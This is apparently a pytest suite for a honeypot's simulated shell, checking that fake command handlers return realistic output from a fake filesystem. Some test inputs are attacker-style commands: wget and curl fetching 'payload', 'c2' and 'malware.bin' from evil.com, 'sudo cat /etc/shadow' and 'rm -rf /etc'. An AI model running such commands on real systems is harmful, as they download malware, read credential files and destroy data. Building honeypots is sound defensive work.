"""Tests for dictionary/command_handlers.py — Tier 1 (Sprint 3).

Every test creates a FakeFS from a real persona and calls a handler with
a parsed command + a SimpleSession. Validates that:
  - output comes from FakeFS state (no hardcoded strings)
  - error cases return realistic bash error messages
  - cd updates session.current_directory
  - history returns session history, not .bash_history
"""
from __future__ import annotations

import re

import pytest

from dictionary.command_handlers import (
    SimpleSession,
    handle_cat,
    handle_cd,
    handle_chmod,
    handle_chown,
    handle_cp,
    handle_curl,
    handle_date,
    handle_df,
    handle_echo,
    handle_env,
    handle_find,
    handle_free,
    handle_grep,
    handle_groups,
    handle_head,
    handle_history,
    handle_hostname,
    handle_id,
    handle_ifconfig,
    handle_ip,
    handle_last,
    handle_ls,
    handle_mkdir,
    handle_mv,
    handle_netstat,
    handle_printenv,
    handle_ps,
    handle_pwd,
    handle_rm,
    handle_ssh,
    handle_su,
    handle_sudo,
    handle_tail,
    handle_touch,
    handle_uname,
    handle_uptime,
    handle_w,
    handle_wget,
    handle_which,
    handle_whoami,
)
from honeypot.command_parser import parse_command
from honeypot.fakefs import FakeFS

PERSONA_NAMES = ["generic_linux", "dev_workstation", "finance_server"]


@pytest.fixture(params=PERSONA_NAMES)
def ctx(request):
    """Yield a (fakefs, session) tuple for each persona."""
    fs = FakeFS(request.param)
    primary = next(
        u for u in fs.persona.users
        if not u.shell.endswith("nologin") and not u.shell.endswith("false")
        and u.username != "root"
    )
    env = fs.get_environment(primary.username)
    sess = SimpleSession(
        current_directory=primary.home,
        current_user=primary.username,
        environment=dict(env),
    )
    return fs, sess


# ---------------------------------------------------------------------------
# ls
# ---------------------------------------------------------------------------

class TestLs:
    def test_ls_cwd(self, ctx):
        fs, sess = ctx
        out = handle_ls(fs, sess, parse_command("ls"))
        assert isinstance(out, str)

    def test_ls_root(self, ctx):
        fs, sess = ctx
        out = handle_ls(fs, sess, parse_command("ls /"))
        for d in ["etc", "home", "var"]:
            assert d in out

    def test_ls_la(self, ctx):
        fs, sess = ctx
        out = handle_ls(fs, sess, parse_command("ls -la /etc"))
        assert "passwd" in out
        assert "shadow" in out
        assert "total" in out

    def test_ls_nonexistent(self, ctx):
        fs, sess = ctx
        out = handle_ls(fs, sess, parse_command("ls /no/such/dir"))
        assert "No such file or directory" in out

    def test_ls_hidden_without_a(self, ctx):
        fs, sess = ctx
        out = handle_ls(fs, sess, parse_command("ls /etc"))
        assert not out.startswith(".")


# ---------------------------------------------------------------------------
# pwd
# ---------------------------------------------------------------------------

class TestPwd:
    def test_returns_cwd(self, ctx):
        fs, sess = ctx
        assert handle_pwd(fs, sess, parse_command("pwd")) == sess.current_directory


# ---------------------------------------------------------------------------
# whoami
# ---------------------------------------------------------------------------

class TestWhoami:
    def test_returns_current_user(self, ctx):
        fs, sess = ctx
        assert handle_whoami(fs, sess, parse_command("whoami")) == sess.current_user


# ---------------------------------------------------------------------------
# id
# ---------------------------------------------------------------------------

class TestId:
    def test_id_self(self, ctx):
        fs, sess = ctx
        out = handle_id(fs, sess, parse_command("id"))
        assert f"({sess.current_user})" in out
        user = fs.get_user(sess.current_user)
        assert f"uid={user.uid}" in out

    def test_id_root(self, ctx):
        fs, sess = ctx
        out = handle_id(fs, sess, parse_command("id root"))
        assert "uid=0" in out
        assert "(root)" in out

    def test_id_unknown(self, ctx):
        fs, sess = ctx
        out = handle_id(fs, sess, parse_command("id nonexistent"))
        assert "no such user" in out


# ---------------------------------------------------------------------------
# uname
# ---------------------------------------------------------------------------

class TestUname:
    def test_uname_a(self, ctx):
        fs, sess = ctx
        out = handle_uname(fs, sess, parse_command("uname -a"))
        assert fs.hostname in out
        assert "Linux" in out

    def test_uname_r(self, ctx):
        fs, sess = ctx
        out = handle_uname(fs, sess, parse_command("uname -r"))
        assert out == fs.persona.system.kernel

    def test_uname_bare(self, ctx):
        fs, sess = ctx
        out = handle_uname(fs, sess, parse_command("uname"))
        assert out == "Linux"


# ---------------------------------------------------------------------------
# hostname
# ---------------------------------------------------------------------------

class TestHostname:
    def test_hostname(self, ctx):
        fs, sess = ctx
        assert handle_hostname(fs, sess, parse_command("hostname")) == fs.hostname

    def test_hostname_fqdn(self, ctx):
        fs, sess = ctx
        out = handle_hostname(fs, sess, parse_command("hostname -f"))
        assert fs.hostname in out

    def test_hostname_i(self, ctx):
        fs, sess = ctx
        out = handle_hostname(fs, sess, parse_command("hostname -i"))
        assert re.match(r"\d+\.\d+\.\d+\.\d+", out)


# ---------------------------------------------------------------------------
# cat
# ---------------------------------------------------------------------------

class TestCat:
    def test_cat_etc_hostname(self, ctx):
        fs, sess = ctx
        out = handle_cat(fs, sess, parse_command("cat /etc/hostname"))
        assert fs.hostname in out

    def test_cat_etc_passwd(self, ctx):
        fs, sess = ctx
        out = handle_cat(fs, sess, parse_command("cat /etc/passwd"))
        assert "root:x:0:0" in out
        assert sess.current_user in out

    def test_cat_nonexistent(self, ctx):
        fs, sess = ctx
        out = handle_cat(fs, sess, parse_command("cat /no/such/file"))
        assert "No such file or directory" in out

    def test_cat_directory(self, ctx):
        fs, sess = ctx
        out = handle_cat(fs, sess, parse_command("cat /etc"))
        assert "Is a directory" in out

    def test_cat_no_args(self, ctx):
        fs, sess = ctx
        out = handle_cat(fs, sess, parse_command("cat"))
        assert out == ""

    def test_cat_multiple_files(self, ctx):
        fs, sess = ctx
        out = handle_cat(fs, sess, parse_command("cat /etc/hostname /etc/os-release"))
        assert fs.hostname in out

    def test_cat_relative_path(self, ctx):
        fs, sess = ctx
        sess.current_directory = "/etc"
        out = handle_cat(fs, sess, parse_command("cat hostname"))
        assert fs.hostname in out


# ---------------------------------------------------------------------------
# echo
# ---------------------------------------------------------------------------

class TestEcho:
    def test_echo_literal(self, ctx):
        fs, sess = ctx
        out = handle_echo(fs, sess, parse_command("echo hello world"))
        assert "hello world" in out

    def test_echo_env_var(self, ctx):
        fs, sess = ctx
        out = handle_echo(fs, sess, parse_command("echo $HOME"))
        user = fs.get_user(sess.current_user)
        assert user.home in out

    def test_echo_user_var(self, ctx):
        fs, sess = ctx
        out = handle_echo(fs, sess, parse_command("echo $USER"))
        assert sess.current_user in out

    def test_echo_empty(self, ctx):
        fs, sess = ctx
        out = handle_echo(fs, sess, parse_command("echo"))
        assert out == ""


# ---------------------------------------------------------------------------
# ps
# ---------------------------------------------------------------------------

class TestPs:
    def test_ps_aux(self, ctx):
        fs, sess = ctx
        out = handle_ps(fs, sess, parse_command("ps aux"))
        assert "PID" in out
        assert "COMMAND" in out
        for proc in fs.persona.processes:
            assert str(proc.pid) in out

    def test_ps_ef(self, ctx):
        fs, sess = ctx
        out = handle_ps(fs, sess, parse_command("ps -ef"))
        assert "UID" in out
        assert "PPID" in out

    def test_ps_bare(self, ctx):
        fs, sess = ctx
        out = handle_ps(fs, sess, parse_command("ps"))
        assert "PID" in out


# ---------------------------------------------------------------------------
# netstat
# ---------------------------------------------------------------------------

class TestNetstat:
    def test_netstat(self, ctx):
        fs, sess = ctx
        out = handle_netstat(fs, sess, parse_command("netstat -tlnp"))
        assert "Proto" in out
        for port in fs.persona.network.open_ports:
            assert f":{port}" in out


# ---------------------------------------------------------------------------
# ifconfig
# ---------------------------------------------------------------------------

class TestIfconfig:
    def test_ifconfig(self, ctx):
        fs, sess = ctx
        out = handle_ifconfig(fs, sess, parse_command("ifconfig"))
        for iface in fs.persona.network.interfaces:
            assert iface.name in out
            assert iface.ip in out


# ---------------------------------------------------------------------------
# ip
# ---------------------------------------------------------------------------

class TestIp:
    def test_ip_addr(self, ctx):
        fs, sess = ctx
        out = handle_ip(fs, sess, parse_command("ip addr"))
        for iface in fs.persona.network.interfaces:
            assert iface.name in out

    def test_ip_route(self, ctx):
        fs, sess = ctx
        out = handle_ip(fs, sess, parse_command("ip route"))
        assert "default via" in out

    def test_ip_link(self, ctx):
        fs, sess = ctx
        out = handle_ip(fs, sess, parse_command("ip link"))
        assert "link/ether" in out

    def test_ip_unknown(self, ctx):
        fs, sess = ctx
        out = handle_ip(fs, sess, parse_command("ip foobar"))
        assert "unknown" in out


# ---------------------------------------------------------------------------
# history — must return SESSION history, not .bash_history
# ---------------------------------------------------------------------------

class TestHistory:
    def test_history_empty(self, ctx):
        fs, sess = ctx
        sess.command_history = []
        out = handle_history(fs, sess, parse_command("history"))
        assert out == ""

    def test_history_with_commands(self, ctx):
        fs, sess = ctx
        sess.command_history = [
            {"raw": "whoami"},
            {"raw": "ls -la"},
            {"raw": "cat /etc/passwd"},
        ]
        out = handle_history(fs, sess, parse_command("history"))
        assert "whoami" in out
        assert "ls -la" in out
        assert "cat /etc/passwd" in out
        lines = out.strip().splitlines()
        assert len(lines) == 3
        assert "1" in lines[0]
        assert "3" in lines[2]

    def test_history_not_bash_history_file(self, ctx):
        """history should show session commands, not the .bash_history file."""
        fs, sess = ctx
        sess.command_history = [{"raw": "unique_probe_cmd_12345"}]
        out = handle_history(fs, sess, parse_command("history"))
        assert "unique_probe_cmd_12345" in out
        bash_history = ""
        try:
            bash_history = fs.get_file_content(
                f"{fs.get_user(sess.current_user).home}/.bash_history"
            )
        except (FileNotFoundError, PermissionError):
            pass
        assert "unique_probe_cmd_12345" not in bash_history


# ---------------------------------------------------------------------------
# env / printenv
# ---------------------------------------------------------------------------

class TestEnv:
    def test_env_shows_all_vars(self, ctx):
        fs, sess = ctx
        out = handle_env(fs, sess, parse_command("env"))
        assert f"USER={sess.current_user}" in out
        assert "PATH=" in out
        assert "HOME=" in out

    def test_printenv_specific(self, ctx):
        fs, sess = ctx
        out = handle_printenv(fs, sess, parse_command("printenv HOME"))
        user = fs.get_user(sess.current_user)
        assert out == user.home

    def test_printenv_missing(self, ctx):
        fs, sess = ctx
        out = handle_printenv(fs, sess, parse_command("printenv NONEXISTENT_VAR"))
        assert out == ""

    def test_printenv_all(self, ctx):
        fs, sess = ctx
        out = handle_printenv(fs, sess, parse_command("printenv"))
        assert "USER=" in out


# ---------------------------------------------------------------------------
# cd
# ---------------------------------------------------------------------------

class TestCd:
    def test_cd_absolute(self, ctx):
        fs, sess = ctx
        out = handle_cd(fs, sess, parse_command("cd /etc"))
        assert out == ""
        assert sess.current_directory == "/etc"

    def test_cd_relative(self, ctx):
        fs, sess = ctx
        user = fs.get_user(sess.current_user)
        parent = user.home.rsplit("/", 1)[0] or "/"
        dirname = user.home.rsplit("/", 1)[1]
        sess.current_directory = parent
        out = handle_cd(fs, sess, parse_command(f"cd {dirname}"))
        assert out == ""
        assert sess.current_directory == user.home

    def test_cd_dotdot(self, ctx):
        fs, sess = ctx
        sess.current_directory = "/home"
        handle_cd(fs, sess, parse_command("cd .."))
        assert sess.current_directory == "/"

    def test_cd_home(self, ctx):
        fs, sess = ctx
        sess.current_directory = "/tmp"
        handle_cd(fs, sess, parse_command("cd"))
        user = fs.get_user(sess.current_user)
        assert sess.current_directory == user.home

    def test_cd_tilde(self, ctx):
        fs, sess = ctx
        sess.current_directory = "/tmp"
        handle_cd(fs, sess, parse_command("cd ~"))
        user = fs.get_user(sess.current_user)
        assert sess.current_directory == user.home

    def test_cd_nonexistent(self, ctx):
        fs, sess = ctx
        old = sess.current_directory
        out = handle_cd(fs, sess, parse_command("cd /no/such/dir"))
        assert "No such file or directory" in out
        assert sess.current_directory == old

    def test_cd_to_file(self, ctx):
        fs, sess = ctx
        old = sess.current_directory
        out = handle_cd(fs, sess, parse_command("cd /etc/passwd"))
        assert "Not a directory" in out
        assert sess.current_directory == old

    def test_cd_updates_pwd_env(self, ctx):
        fs, sess = ctx
        handle_cd(fs, sess, parse_command("cd /etc"))
        assert sess.environment.get("PWD") == "/etc"

    def test_cd_sets_oldpwd(self, ctx):
        fs, sess = ctx
        old = sess.current_directory
        handle_cd(fs, sess, parse_command("cd /etc"))
        assert sess.environment.get("OLDPWD") == old

    def test_cd_dash(self, ctx):
        fs, sess = ctx
        sess.environment["OLDPWD"] = "/tmp"
        handle_cd(fs, sess, parse_command("cd -"))
        assert sess.current_directory == "/tmp"


# ---------------------------------------------------------------------------
# date
# ---------------------------------------------------------------------------

class TestDate:
    def test_date_output(self, ctx):
        fs, sess = ctx
        out = handle_date(fs, sess, parse_command("date"))
        tz = fs.get_system_info()["timezone"]
        assert tz in out
        assert "20" in out


# ---------------------------------------------------------------------------
# uptime
# ---------------------------------------------------------------------------

class TestUptime:
    def test_uptime(self, ctx):
        fs, sess = ctx
        out = handle_uptime(fs, sess, parse_command("uptime"))
        assert "up" in out
        assert "load average" in out


# ---------------------------------------------------------------------------
# df
# ---------------------------------------------------------------------------

class TestDf:
    def test_df(self, ctx):
        fs, sess = ctx
        out = handle_df(fs, sess, parse_command("df -h"))
        assert "Filesystem" in out
        assert fs.persona.disk.filesystem in out


# ---------------------------------------------------------------------------
# free
# ---------------------------------------------------------------------------

class TestFree:
    def test_free(self, ctx):
        fs, sess = ctx
        out = handle_free(fs, sess, parse_command("free -m"))
        assert "Mem:" in out
        assert str(fs.persona.memory.total_mb) in out
        assert "Swap:" in out


# ---------------------------------------------------------------------------
# No hardcoded strings — cross-persona verification
# ---------------------------------------------------------------------------

class TestNoHardcodedStrings:
    """Verify that handler output varies across personas, proving it
    comes from FakeFS rather than hardcoded values.
    """

    def test_hostname_varies(self):
        hostnames = set()
        for name in PERSONA_NAMES:
            fs = FakeFS(name)
            sess = SimpleSession(current_user="root", current_directory="/root")
            out = handle_hostname(fs, sess, parse_command("hostname"))
            hostnames.add(out)
        assert len(hostnames) == 3

    def test_whoami_varies(self):
        users = set()
        for name in PERSONA_NAMES:
            fs = FakeFS(name)
            primary = next(
                u for u in fs.persona.users
                if not u.shell.endswith("nologin") and not u.shell.endswith("false")
                and u.username != "root"
            )
            sess = SimpleSession(
                current_user=primary.username,
                current_directory=primary.home,
            )
            users.add(handle_whoami(fs, sess, parse_command("whoami")))
        assert len(users) == 3

    def test_cat_passwd_varies(self):
        outputs = set()
        for name in PERSONA_NAMES:
            fs = FakeFS(name)
            sess = SimpleSession(current_user="root", current_directory="/root")
            outputs.add(handle_cat(fs, sess, parse_command("cat /etc/passwd")))
        assert len(outputs) == 3

    def test_ps_varies(self):
        outputs = set()
        for name in PERSONA_NAMES:
            fs = FakeFS(name)
            sess = SimpleSession(current_user="root", current_directory="/root")
            outputs.add(handle_ps(fs, sess, parse_command("ps aux")))
        assert len(outputs) == 3


# ===========================================================================
# Tier 2 handler tests
# ===========================================================================

# ---------------------------------------------------------------------------
# find
# ---------------------------------------------------------------------------

class TestFind:
    def test_find_root(self, ctx):
        fs, sess = ctx
        out = handle_find(fs, sess, parse_command("find /etc"))
        assert "/etc" in out
        assert "/etc/passwd" in out

    def test_find_name_filter(self, ctx):
        fs, sess = ctx
        out = handle_find(fs, sess, parse_command("find / -name passwd"))
        assert "/etc/passwd" in out

    def test_find_name_wildcard(self, ctx):
        fs, sess = ctx
        out = handle_find(fs, sess, parse_command("find /etc -name *.conf"))
        for line in out.splitlines():
            if line.strip():
                assert line.endswith(".conf") or line == "/etc"

    def test_find_nonexistent(self, ctx):
        fs, sess = ctx
        out = handle_find(fs, sess, parse_command("find /no/such/dir"))
        assert "No such file or directory" in out

    def test_find_type_f(self, ctx):
        fs, sess = ctx
        out = handle_find(fs, sess, parse_command("find /etc -type f"))
        for line in out.splitlines():
            if line.strip():
                assert fs.is_file(line)

    def test_find_type_d(self, ctx):
        fs, sess = ctx
        out = handle_find(fs, sess, parse_command("find /etc -type d"))
        for line in out.splitlines():
            if line.strip():
                assert fs.is_directory(line)


# ---------------------------------------------------------------------------
# grep
# ---------------------------------------------------------------------------

class TestGrep:
    def test_grep_in_file(self, ctx):
        fs, sess = ctx
        out = handle_grep(fs, sess, parse_command("grep root /etc/passwd"))
        assert "root" in out

    def test_grep_no_args(self, ctx):
        fs, sess = ctx
        out = handle_grep(fs, sess, parse_command("grep"))
        assert "Usage" in out

    def test_grep_no_match(self, ctx):
        fs, sess = ctx
        out = handle_grep(fs, sess, parse_command("grep XYZNONEXISTENT /etc/passwd"))
        assert out == ""

    def test_grep_line_numbers(self, ctx):
        fs, sess = ctx
        out = handle_grep(fs, sess, parse_command("grep -n root /etc/passwd"))
        assert ":" in out


# ---------------------------------------------------------------------------
# which
# ---------------------------------------------------------------------------

class TestWhich:
    def test_which_ls(self, ctx):
        fs, sess = ctx
        out = handle_which(fs, sess, parse_command("which ls"))
        assert "/usr/bin/ls" in out

    def test_which_unknown(self, ctx):
        fs, sess = ctx
        out = handle_which(fs, sess, parse_command("which nonexistentbinary"))
        assert "no nonexistentbinary" in out

    def test_which_no_args(self, ctx):
        fs, sess = ctx
        out = handle_which(fs, sess, parse_command("which"))
        assert out == ""


# ---------------------------------------------------------------------------
# w
# ---------------------------------------------------------------------------

class TestW:
    def test_w_output(self, ctx):
        fs, sess = ctx
        out = handle_w(fs, sess, parse_command("w"))
        assert "USER" in out
        assert sess.current_user in out


# ---------------------------------------------------------------------------
# last
# ---------------------------------------------------------------------------

class TestLast:
    def test_last_output(self, ctx):
        fs, sess = ctx
        out = handle_last(fs, sess, parse_command("last"))
        assert "wtmp begins" in out
        interactive_users = [
            u for u in fs.persona.users
            if not u.shell.endswith("nologin") and not u.shell.endswith("false")
        ]
        for u in interactive_users:
            assert u.username in out


# ---------------------------------------------------------------------------
# groups
# ---------------------------------------------------------------------------

class TestGroups:
    def test_groups_self(self, ctx):
        fs, sess = ctx
        out = handle_groups(fs, sess, parse_command("groups"))
        user = fs.get_user(sess.current_user)
        for g in user.groups:
            assert g in out

    def test_groups_unknown(self, ctx):
        fs, sess = ctx
        out = handle_groups(fs, sess, parse_command("groups nonexistent"))
        assert "no such user" in out


# ---------------------------------------------------------------------------
# sudo
# ---------------------------------------------------------------------------

class TestSudo:
    def test_sudo_denied(self, ctx):
        fs, sess = ctx
        out = handle_sudo(fs, sess, parse_command("sudo cat /etc/shadow"))
        assert "not allowed" in out or "password" in out.lower()
        assert sess.current_user in out

    def test_sudo_no_args(self, ctx):
        fs, sess = ctx
        out = handle_sudo(fs, sess, parse_command("sudo"))
        assert "usage" in out.lower()


# ---------------------------------------------------------------------------
# su
# ---------------------------------------------------------------------------

class TestSu:
    def test_su_fails(self, ctx):
        fs, sess = ctx
        out = handle_su(fs, sess, parse_command("su root"))
        assert "Authentication failure" in out


# ---------------------------------------------------------------------------
# ssh
# ---------------------------------------------------------------------------

class TestSsh:
    def test_ssh_timeout(self, ctx):
        fs, sess = ctx
        out = handle_ssh(fs, sess, parse_command("ssh user@10.0.0.1"))
        assert "timed out" in out or "Connection" in out

    def test_ssh_no_args(self, ctx):
        fs, sess = ctx
        out = handle_ssh(fs, sess, parse_command("ssh"))
        assert "usage" in out.lower()


# ---------------------------------------------------------------------------
# wget
# ---------------------------------------------------------------------------

class TestWget:
    def test_wget_downloads_to_overlay(self, ctx):
        fs, sess = ctx
        out = handle_wget(fs, sess, parse_command("wget http://evil.com/payload"))
        assert "saved" in out.lower()
        assert "payload" in out
        path = fs.resolve_path(sess.current_directory, "payload")
        assert sess.overlay.exists(path, fs)

    def test_wget_custom_output(self, ctx):
        fs, sess = ctx
        out = handle_wget(fs, sess, parse_command("wget -O out.html http://evil.com/payload"))
        path = fs.resolve_path(sess.current_directory, "out.html")
        assert sess.overlay.exists(path, fs)

    def test_wget_no_args(self, ctx):
        fs, sess = ctx
        out = handle_wget(fs, sess, parse_command("wget"))
        assert "missing URL" in out


# ---------------------------------------------------------------------------
# curl
# ---------------------------------------------------------------------------

class TestCurl:
    def test_curl_returns_content(self, ctx):
        fs, sess = ctx
        out = handle_curl(fs, sess, parse_command("curl http://evil.com/c2"))
        assert "html" in out.lower() or "downloaded" in out.lower()

    def test_curl_save_to_file(self, ctx):
        fs, sess = ctx
        out = handle_curl(fs, sess, parse_command("curl -o saved.html http://evil.com/c2"))
        path = fs.resolve_path(sess.current_directory, "saved.html")
        assert sess.overlay.exists(path, fs)
        assert "100" in out

    def test_curl_remote_name(self, ctx):
        fs, sess = ctx
        out = handle_curl(fs, sess, parse_command("curl -O http://evil.com/malware.bin"))
        path = fs.resolve_path(sess.current_directory, "malware.bin")
        assert sess.overlay.exists(path, fs)

    def test_curl_no_args(self, ctx):
        fs, sess = ctx
        out = handle_curl(fs, sess, parse_command("curl"))
        assert "curl" in out


# ---------------------------------------------------------------------------
# chmod / chown / mkdir / touch / rm / cp / mv — all fake-success
# ---------------------------------------------------------------------------

class TestFileOps:
    def test_chmod_success(self, ctx):
        fs, sess = ctx
        out = handle_chmod(fs, sess, parse_command("chmod 755 /etc/passwd"))
        assert out == ""

    def test_chmod_missing(self, ctx):
        fs, sess = ctx
        out = handle_chmod(fs, sess, parse_command("chmod"))
        assert "missing operand" in out

    def test_chown_success(self, ctx):
        fs, sess = ctx
        out = handle_chown(fs, sess, parse_command("chown root:root /etc/passwd"))
        assert out == ""

    def test_chown_nonexistent(self, ctx):
        fs, sess = ctx
        out = handle_chown(fs, sess, parse_command("chown root /no/such/file"))
        assert "No such file or directory" in out

    def test_mkdir_success(self, ctx):
        fs, sess = ctx
        out = handle_mkdir(fs, sess, parse_command("mkdir /tmp/newdir"))
        assert out == ""

    def test_mkdir_no_args(self, ctx):
        fs, sess = ctx
        out = handle_mkdir(fs, sess, parse_command("mkdir"))
        assert "missing operand" in out

    def test_touch_success(self, ctx):
        fs, sess = ctx
        out = handle_touch(fs, sess, parse_command("touch /tmp/newfile"))
        assert out == ""

    def test_touch_no_args(self, ctx):
        fs, sess = ctx
        out = handle_touch(fs, sess, parse_command("touch"))
        assert "missing file operand" in out

    def test_rm_success(self, ctx):
        fs, sess = ctx
        out = handle_rm(fs, sess, parse_command("rm /etc/hostname"))
        assert out == ""

    def test_rm_nonexistent(self, ctx):
        fs, sess = ctx
        out = handle_rm(fs, sess, parse_command("rm /no/such/file"))
        assert "No such file or directory" in out

    def test_rm_directory_without_r(self, ctx):
        fs, sess = ctx
        out = handle_rm(fs, sess, parse_command("rm /etc"))
        assert "Is a directory" in out

    def test_rm_directory_with_rf(self, ctx):
        fs, sess = ctx
        out = handle_rm(fs, sess, parse_command("rm -rf /etc"))
        assert out == ""

    def test_rm_no_args(self, ctx):
        fs, sess = ctx
        out = handle_rm(fs, sess, parse_command("rm"))
        assert "missing operand" in out

    def test_cp_success(self, ctx):
        fs, sess = ctx
        out = handle_cp(fs, sess, parse_command("cp /etc/hostname /tmp/hostname"))
        assert out == ""

    def test_cp_nonexistent(self, ctx):
        fs, sess = ctx
        out = handle_cp(fs, sess, parse_command("cp /no/such/file /tmp/dest"))
        assert "No such file or directory" in out

    def test_cp_no_args(self, ctx):
        fs, sess = ctx
        out = handle_cp(fs, sess, parse_command("cp"))
        assert "missing file operand" in out

    def test_mv_success(self, ctx):
        fs, sess = ctx
        out = handle_mv(fs, sess, parse_command("mv /etc/hostname /tmp/hostname"))
        assert out == ""

    def test_mv_nonexistent(self, ctx):
        fs, sess = ctx
        out = handle_mv(fs, sess, parse_command("mv /no/such/file /tmp/dest"))
        assert "No such file or directory" in out

    def test_mv_no_args(self, ctx):
        fs, sess = ctx
        out = handle_mv(fs, sess, parse_command("mv"))
        assert "missing file operand" in out


# ---------------------------------------------------------------------------
# head / tail
# ---------------------------------------------------------------------------

class TestHeadTail:
    def test_head_default(self, ctx):
        fs, sess = ctx
        out = handle_head(fs, sess, parse_command("head /etc/passwd"))
        assert "root" in out
        assert len(out.splitlines()) <= 10

    def test_head_nonexistent(self, ctx):
        fs, sess = ctx
        out = handle_head(fs, sess, parse_command("head /no/such/file"))
        assert "No such file or directory" in out

    def test_tail_default(self, ctx):
        fs, sess = ctx
        out = handle_tail(fs, sess, parse_command("tail /etc/passwd"))
        assert len(out.splitlines()) <= 10

    def test_tail_nonexistent(self, ctx):
        fs, sess = ctx
        out = handle_tail(fs, sess, parse_command("tail /no/such/file"))
        assert "No such file or directory" in out

    def test_head_no_args(self, ctx):
        fs, sess = ctx
        out = handle_head(fs, sess, parse_command("head"))
        assert out == ""

    def test_tail_no_args(self, ctx):
        fs, sess = ctx
        out = handle_tail(fs, sess, parse_command("tail"))
        assert out == ""
